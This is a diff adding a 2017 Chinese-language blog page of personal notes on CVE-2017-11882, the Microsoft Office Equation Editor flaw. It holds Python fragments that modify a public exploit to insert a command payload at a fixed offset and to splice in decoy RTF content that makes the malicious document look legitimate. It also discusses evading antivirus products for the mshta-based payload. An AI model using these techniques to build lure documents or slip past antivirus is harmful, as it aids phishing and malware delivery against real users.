@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Limpidity</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="shortcut icon" href="/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+<nav class="navbar">
+    <div class="layout">
+        <div class="content ">
+            
+            
+            <a href="/.">Home</a>
+            
+            
+            
+            <a href="/archives">Archive</a>
+            
+            
+        </div>
+    </div>
+</nav>
+
+<main class="post">
+    <article>
+    <h1 class="article-title">
+        <a href="/2017/12/07/11882/"></a>
+    </h1>
+
+    <section class="article-meta">
+        <p class="article-date">December 07 2017</p>
+    </section>
+
+    <section class="article-entry">
+        <hr>
+<h2 id="title-office漏洞小技巧"><a href="#title-office漏洞小技巧" class="headerlink" title="title:office漏洞小技巧"></a>title:office漏洞小技巧</h2><ul>
+<li>CVE-2017-11882 exp小技巧</li>
+<li>CVE-2017-11882 尝试绕过杀软</li>
+</ul>
+<h3 id="CVE-2017-11882-小技巧"><a href="#CVE-2017-11882-小技巧" class="headerlink" title="CVE-2017-11882 小技巧"></a>CVE-2017-11882 小技巧</h3><p>最近一直在看这个洞，上周说要修改一下exp让它能够自定义编辑，后来发现github上有大佬已经更新了新的exp扩充了命令字节长度，并且可以做到自定义编辑。    </p>
+<pre><code class="py">objdata_hex_stream = OBJDATA_TEMPLATE.translate(<span class="keyword">None</span>, <span class="string">"\r\n"</span>)
+ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + len(hex_command):]
+</code></pre>
+<p>exp中给定了OBJDATA_TEMPLATE这个固定的，然后在固定偏移插入payload。很早之前这个office自定义内容好像就已经被写成脚本了，只要用文本编辑器打开正常的rtf文档，复制{*\datastore之前的所有内容，替换到恶意文档里面{\object\objautlink\objupdate之前的内容就可以了。<br>所以我修改在exp上的内容如下：    </p>
+<pre><code class="py">rtf_content=rtf_content.split(<span class="string">"{\object\objemb\objupdate"</span>)[<span class="number">1</span>]+<span class="string">"{\object\objemb\objupdate"</span>
+x=f1.read()
+rtf_content=rtf_content+x.split(<span class="string">"{\*\datastore"</span>)[<span class="number">0</span>]
+output_file = open(args.output, <span class="string">"w"</span>)
+output_file.write(rtf_content)
+</code></pre>
+<p>所以只要根据这个技巧去修改任意相关exp就可以实现自定义编辑文档内容（什么内容吸引人就写什么内容）</p>
+<h3 id="CVE-2017-11882尝试绕过杀软姿势"><a href="#CVE-2017-11882尝试绕过杀软姿势" class="headerlink" title="CVE-2017-11882尝试绕过杀软姿势"></a>CVE-2017-11882尝试绕过杀软姿势</h3><p>因为这个洞的复现和利用都是用mshta，这个利用太多了所以被各大杀软重点关注了，基本上都会被拦截。网上看到的一种方法是替换注入字符，周末试了一下这种方法可以绕过腾讯的电脑管家，但是绕不过360。<br><a href="https://delcoding.github.io/2017/11/office-2017-11882-bypass/" target="_blank" rel="external">https://delcoding.github.io/2017/11/office-2017-11882-bypass/</a>    </p>
+
+    </section>
+</article>
+
+</main>
+<footer class="footer">
+    <p>Powered by Moren YANG&nbsp;&nbsp;-&nbsp;&nbsp;ackn. <a href="https://hexo.io"> Hexo </a></p>
+</footer>
+
+</body>
+</html>
